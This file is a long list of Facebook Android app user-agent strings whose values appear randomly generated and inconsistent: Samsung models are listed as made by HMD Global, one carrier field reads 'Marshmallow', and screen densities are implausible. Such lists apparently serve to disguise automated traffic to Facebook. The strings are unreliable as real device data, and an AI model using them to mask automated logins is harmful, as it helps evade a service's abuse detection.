"[FBAN/FB4A;FBAV/306.0.0.93.93;FBBV/16004922;FBDM/{density=9.7,width=625,height=2598};FBLC/en_US;FBRV/93177131;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J337P;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/242.0.0.73.138;FBBV/77841764;FBDM/{density=3.4,width=617,height=1656};FBLC/en_US;FBRV/90220266;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M127F;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/217.0.0.24.74;FBBV/92342886;FBDM/{density=8.5,width=540,height=1332};FBLC/en_PK;FBRV/64304952;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N986N;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/166.0.0.4.26;FBBV/27713938;FBDM/{density=4.5,width=1266,height=1669};FBLC/en_PK;FBRV/34749074;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C1158;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/56.0.0.48.66;FBBV/12627826;FBDM/{density=9.3,width=1000,height=2553};FBLC/en_US;FBRV/17059366;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung W2019;FBSV/9.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/419.0.0.7.76;FBBV/44115523;FBDM/{density=6.7,width=848,height=1392};FBLC/en_PK;FBRV/55136931;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J727VPP;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/13.0.0.6.93;FBBV/64415673;FBDM/{density=1.6,width=1350,height=2431};FBLC/en_PK;FBRV/91544485;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J327P;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/186.0.0.53.119;FBBV/58896533;FBDM/{density=6.6,width=549,height=1317};FBLC/en_PK;FBRV/70357980;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N930F;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/327.0.0.53.100;FBBV/52546525;FBDM/{density=5.2,width=571,height=2564};FBLC/en_US;FBRV/95097641;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G313MU;FBSV/7.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/275.0.0.62.130;FBBV/24970462;FBDM/{density=6.4,width=976,height=1820};FBLC/en_US;FBRV/52507599;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G7105;FBSV/6.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/149.0.0.50.11;FBBV/32538710;FBDM/{density=5.5,width=553,height=1647};FBLC/en_PK;FBRV/44271886;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J400F;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/287.0.0.84.18;FBBV/34959831;FBDM/{density=5.7,width=808,height=1151};FBLC/en_PK;FBRV/63648241;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A207F;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/325.0.0.3.114;FBBV/42547374;FBDM/{density=5.5,width=1185,height=1544};FBLC/en_US;FBRV/32489611;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G900H;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/46.0.0.63.105;FBBV/41539798;FBDM/{density=8.9,width=1127,height=1821};FBLC/en_GB;FBRV/66556428;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A235F;FBSV/7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/390.0.0.99.68;FBBV/25128594;FBDM/{density=2.5,width=566,height=2931};FBLC/en_GB;FBRV/88368929;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E426B;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/424.0.0.55.113;FBBV/72592302;FBDM/{density=9.2,width=896,height=2962};FBLC/en_GB;FBRV/91183832;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G611L;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/329.0.0.14.20;FBBV/80380199;FBDM/{density=3.3,width=1093,height=1148};FBLC/en_US;FBRV/87057919;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A217F;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/121.0.0.83.27;FBBV/75977346;FBDM/{density=4.7,width=606,height=1952};FBLC/en_GB;FBRV/72629777;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A226BR;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/375.0.0.33.110;FBBV/76355465;FBDM/{density=7.9,width=1463,height=2946};FBLC/en_US;FBRV/13722762;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G996W;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/202.0.0.37.30;FBBV/20326947;FBDM/{density=4.6,width=1124,height=2294};FBLC/en_PK;FBRV/63986279;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N7505;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/71.0.0.86.178;FBBV/28405077;FBDM/{density=7.8,width=840,height=1535};FBLC/en_GB;FBRV/80020333;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G930P;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/151.0.0.24.167;FBBV/39558287;FBDM/{density=2.4,width=1057,height=1725};FBLC/en_GB;FBRV/21709872;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N910V;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/316.0.0.33.117;FBBV/53617363;FBDM/{density=5.1,width=1030,height=1147};FBLC/en_GB;FBRV/52938055;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C7010;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/410.0.0.66.148;FBBV/59498391;FBDM/{density=8.8,width=1053,height=1955};FBLC/en_GB;FBRV/60051518;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C101;FBSV/7.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/74.0.0.22.24;FBBV/89575762;FBDM/{density=2.1,width=1334,height=2033};FBLC/en_GB;FBRV/94996396;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C1158;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/137.0.0.82.177;FBBV/70323712;FBDM/{density=9.3,width=562,height=2847};FBLC/en_US;FBRV/83308642;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N915G;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/154.0.0.56.15;FBBV/38636712;FBDM/{density=6.1,width=561,height=1592};FBLC/en_US;FBRV/23784753;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G3815;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/301.0.0.21.116;FBBV/79501997;FBDM/{density=7.4,width=916,height=1935};FBLC/en_GB;FBRV/19417289;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G925F;FBSV/7.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/317.0.0.66.123;FBBV/61014056;FBDM/{density=5.2,width=770,height=2263};FBLC/en_PK;FBRV/26986952;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung F900W;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/421.0.0.26.143;FBBV/67129608;FBDM/{density=3.4,width=928,height=2305};FBLC/en_GB;FBRV/94338879;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E500M;FBSV/7.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/202.0.0.21.129;FBBV/20355791;FBDM/{density=4.9,width=1371,height=2060};FBLC/en_PK;FBRV/77936911;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G3818;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/427.0.0.48.105;FBBV/43497959;FBDM/{density=3.8,width=1164,height=1996};FBLC/en_PK;FBRV/58540814;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G988B;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/65.0.0.64.124;FBBV/81711674;FBDM/{density=6.8,width=560,height=2833};FBLC/en_PK;FBRV/25085385;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G975U;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/77.0.0.24.14;FBBV/85566022;FBDM/{density=7.6,width=1011,height=2878};FBLC/en_PK;FBRV/81089962;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M526BR;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/413.0.0.73.81;FBBV/36804283;FBDM/{density=5.9,width=866,height=1396};FBLC/en_PK;FBRV/80978892;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A9080;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/25.0.0.60.3;FBBV/57869261;FBDM/{density=6.1,width=520,height=2679};FBLC/en_US;FBRV/18106661;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N9150;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/176.0.0.50.187;FBBV/38661600;FBDM/{density=2.4,width=1181,height=1256};FBLC/en_US;FBRV/55745360;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S506DL;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/79.0.0.65.89;FBBV/26600149;FBDM/{density=3.6,width=1052,height=2286};FBLC/en_US;FBRV/68028758;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J337A;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/279.0.0.24.198;FBBV/25186187;FBDM/{density=7.4,width=741,height=2527};FBLC/en_GB;FBRV/81405493;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G3818;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/258.0.0.8.179;FBBV/16058174;FBDM/{density=7.6,width=1446,height=2946};FBLC/en_GB;FBRV/14376491;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G386T;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/228.0.0.4.130;FBBV/44634467;FBDM/{density=1.8,width=1060,height=2431};FBLC/en_PK;FBRV/66853663;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G3812B;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/404.0.0.76.12;FBBV/86168333;FBDM/{density=5.4,width=1002,height=1558};FBLC/en_PK;FBRV/74772044;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A605FN;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/296.0.0.46.67;FBBV/43347220;FBDM/{density=3.2,width=981,height=1957};FBLC/en_PK;FBRV/36169375;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J260MU;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/407.0.0.6.144;FBBV/51590295;FBDM/{density=9.1,width=585,height=2118};FBLC/en_US;FBRV/65407950;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N986W;FBSV/7.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/238.0.0.90.3;FBBV/16718399;FBDM/{density=4.7,width=577,height=1987};FBLC/en_GB;FBRV/54339411;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C1158;FBSV/9.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/102.0.0.71.26;FBBV/95148149;FBDM/{density=7.3,width=1023,height=2268};FBLC/en_US;FBRV/97053387;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C7108;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/27.0.0.26.183;FBBV/75959333;FBDM/{density=9.2,width=808,height=1546};FBLC/en_PK;FBRV/46812753;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G860P;FBSV/7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/26.0.0.46.13;FBBV/24238967;FBDM/{density=7.7,width=1084,height=2966};FBLC/en_PK;FBRV/58194137;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M317F;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/133.0.0.71.73;FBBV/59390039;FBDM/{density=8.2,width=967,height=2642};FBLC/en_GB;FBRV/59022964;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G730A;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/213.0.0.31.136;FBBV/34506470;FBDM/{density=7.6,width=1005,height=2095};FBLC/en_US;FBRV/12383552;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A908N;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/427.0.0.83.61;FBBV/85452313;FBDM/{density=3.2,width=993,height=1464};FBLC/en_GB;FBRV/73924317;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N9208;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/393.0.0.14.103;FBBV/27998903;FBDM/{density=8.2,width=667,height=1963};FBLC/en_US;FBRV/54475439;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J320A;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/85.0.0.62.116;FBBV/94351510;FBDM/{density=5.5,width=1204,height=1525};FBLC/en_PK;FBRV/79661760;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A700FD;FBSV/8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/227.0.0.70.73;FBBV/31420041;FBDM/{density=2.9,width=616,height=2293};FBLC/en_PK;FBRV/76193873;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G9650;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/28.0.0.21.128;FBBV/87715674;FBDM/{density=8.1,width=1455,height=2864};FBLC/en_GB;FBRV/48562697;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N950F;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/43.0.0.58.57;FBBV/47277265;FBDM/{density=2.5,width=963,height=1837};FBLC/en_PK;FBRV/71755417;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G981B;FBSV/7.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/306.0.0.93.76;FBBV/53012087;FBDM/{density=7.2,width=929,height=1832};FBLC/en_GB;FBRV/90194779;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J720F;FBSV/8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/158.0.0.76.191;FBBV/36728173;FBDM/{density=6.8,width=508,height=2623};FBLC/en_US;FBRV/41819616;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A102U1;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/330.0.0.3.53;FBBV/91886315;FBDM/{density=7.9,width=1120,height=1275};FBLC/en_PK;FBRV/17784781;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J410G;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/60.0.0.74.131;FBBV/84047772;FBDM/{density=9.4,width=708,height=2869};FBLC/en_GB;FBRV/70468553;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G615F;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/216.0.0.25.148;FBBV/66019231;FBDM/{density=7.5,width=818,height=1347};FBLC/en_US;FBRV/37846556;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A707F;FBSV/9.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/316.0.0.18.68;FBBV/29531073;FBDM/{density=2.2,width=708,height=1973};FBLC/en_GB;FBRV/39849775;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A305F;FBSV/7.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/289.0.0.77.14;FBBV/86455927;FBDM/{density=1.1,width=908,height=1443};FBLC/en_PK;FBRV/63227994;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A032M;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/140.0.0.28.30;FBBV/41855101;FBDM/{density=4.4,width=1055,height=2330};FBLC/en_PK;FBRV/35394623;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J110M;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/236.0.0.93.57;FBBV/51460568;FBDM/{density=6.7,width=540,height=2774};FBLC/en_GB;FBRV/93893979;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A700YD;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/256.0.0.2.65;FBBV/49648613;FBDM/{density=7.6,width=733,height=1039};FBLC/en_GB;FBRV/85885874;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N960U;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/95.0.0.77.88;FBBV/66547261;FBDM/{density=6.7,width=1140,height=1482};FBLC/en_US;FBRV/94670908;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M205G;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/193.0.0.28.57;FBBV/94932561;FBDM/{density=5.1,width=523,height=1571};FBLC/en_GB;FBRV/69594762;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N981U;FBSV/9.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/386.0.0.31.151;FBBV/49703234;FBDM/{density=9.8,width=1338,height=1565};FBLC/en_GB;FBRV/86791893;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J260G;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/228.0.0.94.70;FBBV/56855220;FBDM/{density=3.3,width=1371,height=1159};FBLC/en_PK;FBRV/57143278;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N916L;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/52.0.0.41.117;FBBV/68100608;FBDM/{density=2.9,width=797,height=1104};FBLC/en_US;FBRV/82872314;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N915F;FBSV/9.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/311.0.0.8.31;FBBV/83703943;FBDM/{density=9.2,width=1172,height=1466};FBLC/en_US;FBRV/24816825;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A520W;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/241.0.0.67.177;FBBV/98202534;FBDM/{density=6.1,width=837,height=1299};FBLC/en_GB;FBRV/32528592;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N900;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/112.0.0.17.161;FBBV/61566392;FBDM/{density=3.1,width=1443,height=2008};FBLC/en_PK;FBRV/17520469;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A336E;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/117.0.0.2.78;FBBV/28563874;FBDM/{density=1.1,width=536,height=2551};FBLC/en_GB;FBRV/38027955;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M315F;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/357.0.0.24.54;FBBV/89041541;FBDM/{density=8.9,width=1470,height=2324};FBLC/en_PK;FBRV/75478803;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A910F;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/255.0.0.31.90;FBBV/74050624;FBDM/{density=5.8,width=816,height=1185};FBLC/en_GB;FBRV/54895102;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G610Y;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/130.0.0.1.160;FBBV/69307266;FBDM/{density=3.4,width=569,height=2262};FBLC/en_GB;FBRV/14044750;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J810M;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/67.0.0.68.68;FBBV/91907604;FBDM/{density=3.5,width=774,height=1925};FBLC/en_PK;FBRV/20138797;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J106H;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/181.0.0.97.122;FBBV/82724793;FBDM/{density=4.2,width=1353,height=2268};FBLC/en_US;FBRV/28079541;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N930W8;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/99.0.0.12.54;FBBV/50651658;FBDM/{density=5.5,width=1395,height=1325};FBLC/en_US;FBRV/82992321;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J210F;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/30.0.0.1.99;FBBV/12730028;FBDM/{density=9.7,width=1471,height=1920};FBLC/en_GB;FBRV/83649491;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E700F;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/378.0.0.46.41;FBBV/42034301;FBDM/{density=7.5,width=906,height=1186};FBLC/en_GB;FBRV/85945362;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M515F;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/52.0.0.81.124;FBBV/29494137;FBDM/{density=6.4,width=1064,height=1793};FBLC/en_PK;FBRV/33054709;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C9000;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/113.0.0.97.84;FBBV/74521413;FBDM/{density=7.9,width=500,height=1503};FBLC/en_GB;FBRV/84237086;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J737A;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/370.0.0.44.32;FBBV/80268927;FBDM/{density=1.9,width=795,height=1098};FBLC/en_PK;FBRV/52321543;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G780G;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/380.0.0.97.102;FBBV/16060805;FBDM/{density=4.6,width=505,height=2394};FBLC/en_US;FBRV/38944968;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung T116NY;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/28.0.0.95.175;FBBV/70229272;FBDM/{density=5.6,width=533,height=2954};FBLC/en_GB;FBRV/25684913;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A736B;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/42.0.0.19.86;FBBV/87317997;FBDM/{density=6.3,width=1089,height=2376};FBLC/en_US;FBRV/79321447;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G5520;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/16.0.0.64.60;FBBV/28373338;FBDM/{density=3.2,width=866,height=1794};FBLC/en_GB;FBRV/20859297;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung C500X;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
